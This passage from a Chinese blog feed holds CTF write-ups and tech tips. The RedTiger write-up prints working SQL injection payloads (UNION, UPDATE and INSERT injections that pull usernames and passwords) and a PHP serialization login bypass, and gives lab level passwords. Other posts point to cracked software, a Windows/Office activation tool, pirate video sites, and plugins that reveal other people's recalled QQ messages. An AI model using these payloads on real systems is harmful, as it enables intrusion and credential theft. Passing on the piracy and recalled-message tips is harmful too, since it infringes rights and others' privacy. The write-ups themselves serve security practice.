%23</span></span><br></pre></td></tr></table></figure></p><p>换一下语句,各个列位尝试了一下，发现只有第二个先能显示正常，尝试一下把username换成password,发现都失败，猜测第二次sql语句查询应该是根据username字段。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,username,3,4,5 from level6_users <span class="built_in">where</span> status=1</span><br></pre></td></tr></table></figure></p><p>在第二个列位输入，再输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,<span class="string">'union select 1,2,3,4,5#,3,4,5</span></span><br></pre></td></tr></table></figure></p><p>发现报错，将<code>nion select 1,&#39;union select 1,2,3,4,5#</code>转换成十六进制<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,0x27756E696F6E2073656C65637420312C322C332C342C3523,3,4,5</span><br></pre></td></tr></table></figure></p><p>成功，2,4回显，现在就可以开始正常的流程爆数据了。<br><br>最终的payload，原来的语句<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,<span class="string">'union select 1,username,3,password,5 from level6_users where status=1#,3,4,5</span></span><br></pre></td></tr></table></figure></p><p>转换成十六进制<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php</span><br><span class="line">?user=0 union select 1,0x27756E696F6E2073656C65637420312C757365726E616D652C332C70617373776F72642C352066726F6D206C6576656C365F7573657273207768657265207374617475733D3123,3,4,5</span><br></pre></td></tr></table></figure></p><p>看别下一关的：keep_in_mind_im_not_blind</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>过滤了挺多的,输入’得到报错语句<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">An error occured!:</span><br><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">'%'</span> OR text.title LIKE <span class="string">'%'</span>%<span class="string">')'</span> at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE <span class="string">'%'</span>%<span class="string">' OR text.title LIKE '</span>%<span class="string">'%'</span>)</span><br></pre></td></tr></table></figure></p><p>从报错语句中可以看出后台的查询语句。开始构造语句绕过，注释符，限制挺多的，一个个尝试，发现–%a可以绕过<br>获得显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search=search=1%<span class="string">') union select 1,2,3,4 --%a0&amp;dosearch=search%21</span></span><br></pre></td></tr></table></figure></p><p>最终<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search=search=1%<span class="string">') union select 1,2,autor,4 from level7_news --%a0&amp;dosearch=search%21</span></span><br></pre></td></tr></table></figure></p><p>下一关的：no_pernel_kanic_on_the_titanic</p><h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p>在email处，输入’成功报错，其他处正常，报错语句为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">'12345\'</span><span class="string">', age = '</span>25<span class="string">' WHERE id = 1'</span> at line 3 Username:</span><br></pre></td></tr></table></figure></p><p>大概 update table set 的更新语句。<br>如果update语句中有a=b这样的语句就会将当前记录的b的值赋值到a.</p><p>最终payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">email=hans%40localhost<span class="string">',name=password,icq='</span>&amp;name=Hans&amp;icq=12345&amp;age=25&amp;edit=Edit</span><br></pre></td></tr></table></figure></p><p>下一关：cybercyber_vuln</p><h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><p>在留言框中输入’会出现报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">''</span><span class="string">''</span>)<span class="string">' at line 6Autor:</span></span><br></pre></td></tr></table></figure></p><p>尝试用括号,</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=<span class="string">'),('</span>&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p>出现报错，尝试很多次，用下面的语句成功回显，1,2<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=<span class="string">'),(1,2,'</span>&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure></p><p>最终payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=<span class="string">'),((select username from level9_users limit 1),(select password from level9_users limit 1),'</span>&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure></p><p>下一关的：get_post_cookie_head__kittens_eating_all_my_bread</p><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><p>抓包得到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9&amp;dologin=Login</span><br></pre></td></tr></table></figure></p><p>将login的值，base64解密一下的得到一段账户密码的序列化<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:<span class="string">"username"</span>;s:6:<span class="string">"Monkey"</span>;s:8:<span class="string">"password"</span>;s:12:<span class="string">"0815password"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>一开始直接改username为TheMaster发现不成功，查看资料，才知道要将password的值改为bool类型的，例如我们只需要将password的属性修改为boolean类型的true，那么就可以绕过检查了。所以payload的形式为:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:<span class="string">"username"</span>;s:9:<span class="string">"TheMaster"</span>;s:8:<span class="string">"password"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p><p>最后将这个字符串进行base64编码,<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=</span><br></pre></td></tr></table></figure></p><p>最终的payload</p><pre><code class="bash"></code></pre>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>QQ自动抢红包和查看别人撤回的消息</title>
      <link href="/posts/472f3104.html"/>
      <url>/posts/472f3104.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>QQ自动抢红包和和查看别人撤回的消息，这两个功能的实现首先要有两个前提，安卓手机支持root和成功安装xposed框架，现在的很多手机基本上都不能root，天生支持root的魅族手机，也就成了一些喜欢越狱玩转手机炫酷功能的人最爱。不同手机型号root的方式不同，可以根据自己的型号自行找资料。最近，偶然间在手机模拟器上实现这两个功能，发现十分简易。<br><a id="more"></a></p><h1 id="安装逍遥模拟器"><a href="#安装逍遥模拟器" class="headerlink" title="安装逍遥模拟器"></a>安装逍遥模拟器</h1><p>现在的手机模拟器都是自动带有root功能的，只要自动开启就行了。<br><img src="http://p4gdp8beq.bkt.clouddn.com/1212.png" alt=""><br>我尝试用过很多手机模拟器，觉得逍遥模拟器，是比较稳定和好用的，而且可以支持多线程地开启多个模拟器。电脑上自行下载和安装。首先在模拟器的设置中调小一下内存和cpu占用率，如果电脑内存本来就小，模拟器占用太多是会导致电脑很卡。</p><h1 id="安装必需的软件"><a href="#安装必需的软件" class="headerlink" title="安装必需的软件"></a>安装必需的软件</h1><p>首先建议下载个uc浏览器，自带的浏览器本来就是为了下载游戏用的，不太好用。然后在uc浏览器中搜索xposed框架安装器下载，启动安装器，进行安装会自动根据手机的安卓版本安装正确的exposed框架。<br><img src="http://p4gdp8beq.bkt.clouddn.com/6.png" alt=""></p><p><img src="http://p4gdp8beq.bkt.clouddn.com/8.png" alt=""><br>exposed框架此时是没有激活的，点击安装更新，进行激活，会弹出是否启用允许使用root,在这过程中有出现此提醒，全部都允许。重启会卡住，要手动关闭模拟器，再启动。<br><img src="http://p4gdp8beq.bkt.clouddn.com/2y.png" alt=""><br>然后去下载qq自动抢红包插件和qq防撤回插件，qq防撤回插件要最新的，现在好像是2.20版本。这两个插件可以在uc浏览器上搜索，也可以在xposed商店上下载。下载完成后，默认是没有启动的，要在xposed框架的模块中把这两个插件打钩，然后重启模拟器，就自动激活了。</p><p><img src="http://p4gdp8beq.bkt.clouddn.com/5y.png" alt=""></p><p>然后下载qq，版本不要太新，然后就会在qq上看到多出了撤回的功能，把想要的功能打钩，就可以了。<br><img src="http://p4gdp8beq.bkt.clouddn.com/3y.png" alt=""><br><img src="http://p4gdp8beq.bkt.clouddn.com/4y.png" alt=""></p><h1 id="实践一下功能。"><a href="#实践一下功能。" class="headerlink" title="实践一下功能。"></a>实践一下功能。</h1><p>我发了一个红包和撤回一条消息，查看一下效果。<br><img src="http://p4gdp8beq.bkt.clouddn.com/7.png" alt=""></p><p>因为懒，其中有些写得不详细，有遇到问题可以跟我探讨一下。这两个功能只是冰山一角而已，还有很多骚操作，去探索一下。</p>]]></content>
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>无法忍受云盘的限速</title>
      <link href="/posts/d615baa4.html"/>
      <url>/posts/d615baa4.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自从百度云盘的破解版被封后，那个下载速度简直惨不忍睹。不想开通会员，只好另寻它法。偶然间看到一个谷歌的插件baidudl，他可以获得百度云盘的下载地址，然后可以使用第三方软件下载了，比如说迅雷、IDM等等<br><a id="more"></a></p><h1 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h1><p>这个插件你可以在谷歌商店中搜索到，不过要翻墙，如果你不能翻墙上网，提供个百度云下载地址</p><p>链接：<a href="https://pan.baidu.com/s/1kWwRh8F" target="_blank" rel="noopener">https://pan.baidu.com/s/1kWwRh8F</a> 密码：yajs</p><p>如这里说一下不能翻墙，怎样安装插件在浏览器吧。</p><p>首先解压压缩包，在extension_1_3_5_0.crx,右击选择属性，然后更改，更改成极速游览器或者chrome，看你使用哪个浏览器，我这里使用的是极速演示，确认后，直接运行就就会帮你安装在浏览器上。</p><p><img src="http://p4gdp8beq.bkt.clouddn.com/54qa4.png" alt=""><br><img src="http://p4gdp8beq.bkt.clouddn.com/2.jpg" alt=""><br><img src="http://p4gdp8beq.bkt.clouddn.com/1.png" alt=""></p><h1 id="获取下载链接"><a href="#获取下载链接" class="headerlink" title="获取下载链接"></a>获取下载链接</h1><p>然后在你的浏览器中，登入百度云盘。就可以获取到连接了。然后copy到第三方软件下载。</p><p><img src="http://p4gdp8beq.bkt.clouddn.com/qwe3.png" alt=""></p><p>生成的下载链接包括 Glinks 和 Hlinks ，Glinks 含义是：链接比较稳定但是速度比较慢。Hlinks 含义：链接比较不稳定但下载速度更快。个人建议使用Glinks的。</p><h1 id="使用第三方软件下载"><a href="#使用第三方软件下载" class="headerlink" title="使用第三方软件下载"></a>使用第三方软件下载</h1><p><img src="http://p4gdp8beq.bkt.clouddn.com/4.png" alt=""></p><p>迅雷：在国内迅雷使用较广。它的下载原理：是原网址下载+P2P下载，其中P2P下载就是在你下载文件的同时，你也会成为服务器上传资源给别人，你下载的东西来源也是从其他正在下载的其他迅雷用户的电脑那里传来的。同时这也是为什么说P2P在较多人下载使用的时候，速度会快的原因。因为每个使用P2P下载的人下载的同时也上传，成为加速服务器。</p><p>IDM:是国外的商业下载软件，是要付费的，这里提供一个破解盘的云盘地址，在云盘中选择一个安装。 <a href="http://idman.ys168.com/" target="_blank" rel="noopener">http://idman.ys168.com/</a>  下载原理：IDM 是 HTTP，HTTPS，FTP 协议的下载工具，不包括 BT，EMULE 等 P2P 下载协议，如果对迅雷P2P限制下载的约束下，IDM具有优势，IDM也是多线程下载，把一个文件分成多段同时下载再合并。并且支持断点续传。但是，如果下载文件过大合并时间就会偏长点。</p>]]></content>
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>你还在买vip看视频吗</title>
      <link href="/posts/5a2301f5.html"/>
      <url>/posts/5a2301f5.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>还记得，第一次买爱奇艺vip看视频，被坑的经历。<br><a id="more"></a><br>看首月6元挺便宜的，刚好有些视频想追，就买了一个月， 突然有一天，手机收到一条支付宝支出15元的短息，慌了一下，支付宝被人用了吗。<br><img src="http://p4gdp8beq.bkt.clouddn.com/1456465.jpg" alt=""></p><p>立即进支付宝查了一下账单，发现是爱奇艺会员的自动续费的费用，原来在开通爱奇艺首月时，默认的自动续费是开着的，不带这么坑的吧！<br><img src="http://p4gdp8beq.bkt.clouddn.com/4555.jpeg" alt=""></p><p>后来，发现有一些网站可以解析vip视频，像爱奇艺、腾讯等等的vip视频都能看，当然，好东西不能独享，就给出一条如下地址吧</p><p><a href="http://fengshayun.top/vip/" target="_blank" rel="noopener">风沙娱乐</a></p><p>使用方法，只要把你想看的vip视频的地址放入上面网站的视频解析接口上，播放就行。举个例子。<br>进入网页版的腾讯，找到想要看的vip视频，对着视频右击，复制链接地址<br><img src="http://p4gdp8beq.bkt.clouddn.com/12.png" alt=""><br>进入视频解析网站,在视频链接上粘贴地址<br><img src="http://p4gdp8beq.bkt.clouddn.com/456456.jpg" alt=""></p><p>开始看啦</p><p><img src="http://p4gdp8beq.bkt.clouddn.com/45.jpg" alt=""></p><p>有时候，我们想看一部视频，但是一直找不到，怎么办，放弃吗？ 一个快速找到想要视频的地址和种子如下</p><p><a href="http://www.cilimao.me/" target="_blank" rel="noopener">磁力猫</a></p>]]></content>
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>电脑系统的重装和激活</title>
      <link href="/posts/b884f343.html"/>
      <url>/posts/b884f343.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>很多是学计算机相关的，但是好像能够自己重装系统的人还是比较少的，看了一下网上的教程，虽然有很多种方法，但是感觉不是很详细，有些步骤得的忽略，很容易导致系统重装失败。我记得第一次重装系统是在大一下学期的时候，那时候在玩注册表的时候，一不小心把登入账号给弄没了，只留下一个我忘记密码的登入账号，没办法只能重装系统。当时不会装系统，跟舍友搞了一天，安装错了很多次，把电脑所有的资料都给格式化了。我的资料啊！心塞！</p><a id="more"></a><p> 准备: 一个u盘，大小建议大于8g以上的。</p><h1 id="创建系统盘"><a href="#创建系统盘" class="headerlink" title="创建系统盘"></a>创建系统盘</h1><p>我用的是电脑店软件来重装系统的，个人觉得挺好用的。首先进入<a href="http://u.diannaodian.com/" target="_blank" rel="noopener">官网</a>下载。我选择的是<a href="https://pan.baidu.com/s/1i5ejADJ#list/path=%2F" target="_blank" rel="noopener">百度云盘</a>下载的（下载解压后直接启动就行了）</p><p>启动软件后，选择u盘启动，选择的设备：插入u盘后就会自动识别。启动模式USB-HDD，分区格式:建议选择NTFS模式。因为FAT32在实际运行中不支持单个文件大于4GB的文件，一旦超过容量限制那么系统就会提示磁盘空间不足（而系统镜像的大小一般都大于4g）。如果是苹果电脑的话，就选择Exfat模式。然后点击开始制作就行了。如果制作系统盘过程中杀毒软件有阻止某些操作的话，请选择允许。<br><img src="http://p4gdp8beq.bkt.clouddn.com/123.png" alt=""></p><p>制作中<br><img src="http://p4gdp8beq.bkt.clouddn.com/2.png" alt=""></p><p>制作完成 </p><p><img src="http://p4gdp8beq.bkt.clouddn.com/10.png" alt=""></p><p>注意警告！可以选择是，会弹出一个虚拟的系统终端，然后关闭</p><h1 id="下载系统镜像"><a href="#下载系统镜像" class="headerlink" title="下载系统镜像"></a>下载系统镜像</h1><p>建议到<a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">MSDN我告诉你</a>去下载镜像。<br>这里面有很多镜像系统，选择win10最新的、64位系统镜像的，复制其ed2k链接到迅雷中下载。<br><img src="http://p4gdp8beq.bkt.clouddn.com/3.png" alt=""></p><p>复制到迅雷</p><p><img src="http://p4gdp8beq.bkt.clouddn.com/5.png" alt=""></p><h1 id="复制系统到系统盘（即U盘）"><a href="#复制系统到系统盘（即U盘）" class="headerlink" title="复制系统到系统盘（即U盘）"></a>复制系统到系统盘（即U盘）</h1><p>在点击下载的ios镜像中，在里面找到<code>install.win</code>的文件将其复制到系统盘<br><img src="http://p4gdp8beq.bkt.clouddn.com/4511111116.png" alt=""></p><p><img src="http://p4gdp8beq.bkt.clouddn.com/45.png" alt=""></p><h1 id="进入bios修改成U盘优先启动"><a href="#进入bios修改成U盘优先启动" class="headerlink" title="进入bios修改成U盘优先启动"></a>进入bios修改成U盘优先启动</h1><p>电脑品牌和型号不同进入bios中的方式不同，怎样的方式也有点不同，自己要先百度一下。我这里的实验的电脑是联想xiaoxin 700-151sk。我在开机时按fn+f2键进入bios系统。<br><img src="http://p4gdp8beq.bkt.clouddn.com/copy2.png" alt=""><br>在Boot中 找到优先启动的选项，将USB HDB设为第一个（不同电脑型号方法有所不同），即U盘优先启动。然后按fn+f10保存修改并离开</p><p><img src="http://p4gdp8beq.bkt.clouddn.com/copy.png" alt=""></p><h1 id="开始重装系统"><a href="#开始重装系统" class="headerlink" title="开始重装系统"></a>开始重装系统</h1><p>插入u盘，重启电脑。会进入系统盘中的系统中，建议选择启动win8PEX86（win10pe启动占用内存大启动慢），进入win8pe系统后，点击<code>电脑店一键装机</code> ，</p><p><img src="http://p4gdp8beq.bkt.clouddn.com/copy1.png" alt=""><br>映像文件：选择u盘上的镜像(win后缀的）<br>盘符：选择C盘 ，点击执行即可。然后耐心等待系统重装完成后，拔掉u盘，重启系统。然后就配置一些选项就好了。</p><p><img src="http://p4gdp8beq.bkt.clouddn.com/copy3.png" alt=""></p><h1 id="激活系统"><a href="#激活系统" class="headerlink" title="激活系统"></a>激活系统</h1><p>安装完系统，默认是没有激活的。这时候，你就要下载一个小工具，安装，运行，点击红色按钮，它就会帮你激活。悄悄告诉你，这个工具也可以激活office系列2016的办公软件哦！给你个office办公软件百度云盘</p><p>激活工具：链接：<a href="https://pan.baidu.com/s/1c2O92Qs" target="_blank" rel="noopener">https://pan.baidu.com/s/1c2O92Qs</a> 密码：f9ro</p><p>office2016下载地址：<a href="http://pan.baidu.com/s/1bVtjGU" target="_blank" rel="noopener">http://pan.baidu.com/s/1bVtjGU</a></p><p><img src="http://p4gdp8beq.bkt.clouddn.com/456416.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>moctf迎春赛部分writeup</title>
      <link href="/posts/58504f2f.html"/>
      <url>/posts/58504f2f.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>春节之际，集大和理工的学长开始搞事情啦！<br><a id="more"></a><br>先做个小广告 :  <a href="http://www.moctf.com/home" target="_blank" rel="noopener">moctf平台</a> MOCTF平台是厦门理工大学CodeMonster和集美大学Mokirin这两支CTF战队所搭建的一个CTF在线答题系统。题目形式与各大CTF比赛相同。目的是为两个学校中热爱信息安全的同学们提供一个刷题的平台，能够一起学习、进步。</p><p><a href="https://github.com/xishir/moctf/tree/master/2018MOCTF" target="_blank" rel="noopener">官方的writeup</a></p><p>此次比赛，能力不足, web题就只做出简单的一题</p><p><img src="http://img1.gtimg.com/comic/pics/hv1/103/133/2032/132164818.jpg" alt=""></p><h1 id="是时候让你的手指锻炼一下了"><a href="#是时候让你的手指锻炼一下了" class="headerlink" title="是时候让你的手指锻炼一下了"></a>是时候让你的手指锻炼一下了</h1><p>首先查看源代码<br><img src="http://p4gdp8beq.bkt.clouddn.com/1231.png" alt=""><br>看代码可知，只要clicks&gt;108000就会发送一个get请求，如果手动点击108000，那你加油哦！ 直接构造 ？clicks=108001 get请求，即可看到flag</p><p>做不了web题，只能来做杂项了。</p><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>这题，应该是一台主机向另一台主机请求flag信息，只要看返回的那条信息数据包，即那第二条显眼的黑色数据包，是192.168.1.2返回192.168.1.1的应答。直接追踪流-&gt;tcp就得到flag</p><h1 id="base全家桶"><a href="#base全家桶" class="headerlink" title="base全家桶"></a>base全家桶</h1><p>用了base16 、base32、base64加密，依次解密即可的flag</p><h1 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h1><p>aaencode加密，直接在粘贴到浏览器上的控制台上运行即可得到flag</p><h1 id="奇怪的十六进制"><a href="#奇怪的十六进制" class="headerlink" title="奇怪的十六进制"></a>奇怪的十六进制</h1><p>是先转化成ascii码，在base64两次解密即可得到flag</p><h1 id="先越过这道栅栏再说"><a href="#先越过这道栅栏再说" class="headerlink" title="先越过这道栅栏再说"></a>先越过这道栅栏再说</h1><p>先栅栏解密，然后在凯撒解密</p><h1 id="空word"><a href="#空word" class="headerlink" title="空word"></a>空word</h1><p>一开始改后缀为压缩包格式，没发现什么。然后把word中文件-&gt;选项-&gt;显示中全部都打上勾。发现横横点点，猜是摩斯密码，一个个的拼接起来，看的眼多花了，还弄错了几个，心累。</p><p>摩斯密码解密后，16进制数转化成ascii码，得到flag</p><h1 id="一万年的爱有多久"><a href="#一万年的爱有多久" class="headerlink" title="一万年的爱有多久"></a>一万年的爱有多久</h1><p>这道题压缩包被压缩了5000次，直接上py解压.</p><pre><code class="bash">import zipfileimport osfilename1=<span class="string">"KIhn9j7FfG .zip"</span>i=0<span class="keyword">while</span> True:    filename=filename1    <span class="keyword">if</span>(zipfile.is_zipfile(filename)):        fz=zipfile.ZipFile(filename)    <span class="keyword">else</span>:        <span class="built_in">print</span>(<span class="string">"解压完成"</span>)        file=open(<span class="string">"filename"</span>,<span class="string">'r'</span>)        s=file.read()        <span class="built_in">print</span>(s)        <span class="built_in">exit</span>(0)    <span class="keyword">for</span> file <span class="keyword">in</span> fz.namelist():        i=i+1        <span class="built_in">print</span>(i)        filename1=file        fz.extract(file)        try:            os.remove(filename)        except:            pass</code></pre><h1 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker!!!"></a>Hacker!!!</h1><p>这道题其实就是向服务器发送一条条请求，猜解This_Is_Column_Name这个字段的值，即flag的值。观察下图两个方框的值（后面的两个方框为同一个），所以只要查看猜解这个字段第n个字符的最后一条发送的数据包，所有的位置拼接起来就是flag，做这题真的是看得眼都花了。<br><img src="http://p4gdp8beq.bkt.clouddn.com/45646.png" alt=""></p><h1 id="李华的疑惑"><a href="#李华的疑惑" class="headerlink" title="李华的疑惑"></a>李华的疑惑</h1><p>一开始直接打开txt文档，里面全部是满满的数，什么鬼，不知道什么东西。然后用notepad++打开，是一条条以逗号间隔的数的三位数，我觉得有点像rgb,然后就百度了一下，发现可以可以用 这些数字，拼成图片。直接上Py得到解码密码。</p><pre><code class="bash">from PIL import Imagex=150y=150im=Image.new(<span class="string">"RGB"</span>,(x,y))file=open(<span class="string">"pa.txt"</span>)<span class="keyword">for</span> i <span class="keyword">in</span> range(0,x):    <span class="keyword">for</span> j <span class="keyword">in</span> range(0,y):        <span class="built_in">print</span>(n)        line=file.readline()        rgb=line.split(<span class="string">","</span>)        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))im.show()im.save(<span class="string">"flag.jpg"</span>)</code></pre><p>进入后，发现一堆好像是base64加密的字符串，多次拆分用字符串，用base64解密不成功，只好放弃。尝试了大量的解密方法后，偶然用aes解密正确。</p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> 赛事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 赛事 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>你的忙碌是为了忙碌吗</title>
      <link href="/posts/3b00664c.html"/>
      <url>/posts/3b00664c.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" 请输入文章密码！ "> <label for="pass"> 请输入文章密码！ </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> 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